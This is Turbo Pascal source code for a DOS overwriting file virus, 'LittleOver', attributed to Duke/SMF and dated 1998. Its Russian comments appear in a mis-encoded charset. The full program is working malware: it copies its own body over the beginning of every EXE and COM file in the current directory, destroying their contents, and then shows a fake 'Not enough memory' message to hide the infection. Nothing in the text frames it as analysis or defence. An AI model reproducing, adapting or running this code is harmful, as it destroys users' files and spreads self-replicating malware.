   (*            HLLO.LittleOver.2688 (c) by Duke/SMF

   Name   : LittleOver version 1
   Author : Duke/SMF
   Date   : 28.09.98
   Type   : HLLO

   Žç¥ì ®¯ áë© ¥à¥§¨¤¥âë© ¥¯®«¨¬®àäë© ä ©«®¢ë© ¢¨àãá. * ¯¨á    Turbo
   Pascal 7.0. ‡ ¯¨áë¢ ¥âáï ¢  ç «® ¢á¥å EXE ¨ COM ä ©«®¢ â¥ªãé¥£® ª â «®£ ,
   ¥ á®åà ïï ®à¨£¨ «ì®£® á®¤¥à¦¨¬®£® ä ©«®¢ ¨ ¥ ¨§¬¥ïï à §¬¥à ä ©« .
   *¥à¥¤ § à ¦¥¨¥¬   ä ©« ãáâ  ¢«¨¢ ¥âáï  âà¨¡ãâ "€àå¨¢ë©".
   Žç¥ì ¯à¨¬¨â¨¢ë© (¥ ¯à®¢¥àï¥â   ¯®¢â®à®¥ § à ¦¥¨¥) ¨ ¨¬¥¥â ¬ «ë© à §¬¥à.
   ‘®¤¥à¦¨â ¢ â¥«¥ áâà®ªã "[LittleOver, Duke/SMF]", ª®â®à ï   íªà  ¨ª®£¤ 
   ¥ ¢ë¢®¤¨âáï. ‚ ª®æ¥ à ¡®âë ¢ë¤ ¥â á®®¡é¥¨¥ "Not enough memory".
   ---------------------------------------------------------------------------*)
   {$I-,S-}                         {¨á¯®«ì§ãîâáï ¤«ï ã¬¥ìè¥¨ï ª®¤  ¢¨àãá }
   uses dos;
   const len=2688;
   var vir   : file;                        {§ ¯ãé¥ë© ¢¨àãá}
       mas   : array[1..len] of byte;       {¬ áá¨¢ á â¥«®¬ ¢¨àãá }
   {--------------------------------------}
   procedure Infect(i:string);              {‡ à ¦¥¨¥ ä ©«®¢}
   var g:file;
   begin
   assign(g,i);
   setfattr(g,$20);                         {ãáâ ®¢ª   âà¨¡ãâ  Arhive}
   reset(g,1);                              {®âªàë«¨ ä ©«-¦¥àâ¢ã}
   blockwrite(g,mas,len);                   {§ ¯¨á «¨ ¯®¢¥àå ¢¨àãá}
   close(g);                                {§ ªàë«¨ ¦¥àâ¢ã}
   end;
   {---------------------------------------}
   procedure Find(st:string);               {*®¨áª ä ©«®¢ ¢ â¥ªãé¥¬ ª â «®£¥}
   var s:searchrec;
   begin
   findfirst(st,$21,s);
   while doserror=0 do
     begin
     Infect(s.name);
     findnext(s);
     end;
   end;
   {---------------------------------------}
   begin
   assign(vir,paramstr(0));reset(vir,1);
   blockread(vir,mas,len);
   close(vir);
   Find('*.exe');                             {¯®¨áª *.exe}
   Find('*.com');                             {¯®¨áª *.com}
   asm
          jmp  @Next
          db   '[LittleOver, Duke/SMF]',0     {copyright ¢¨àãá }
   @TXT:  db   'Not enough memory$'
   @Next:                                     {¢ë¢®¤ áâà®ª¨   íªà }
          push ds
          push cs
          pop  ds
          mov  dx,offset @TXT
          mov  ah,9
          int  21h
          pop  ds
   end;
   end.
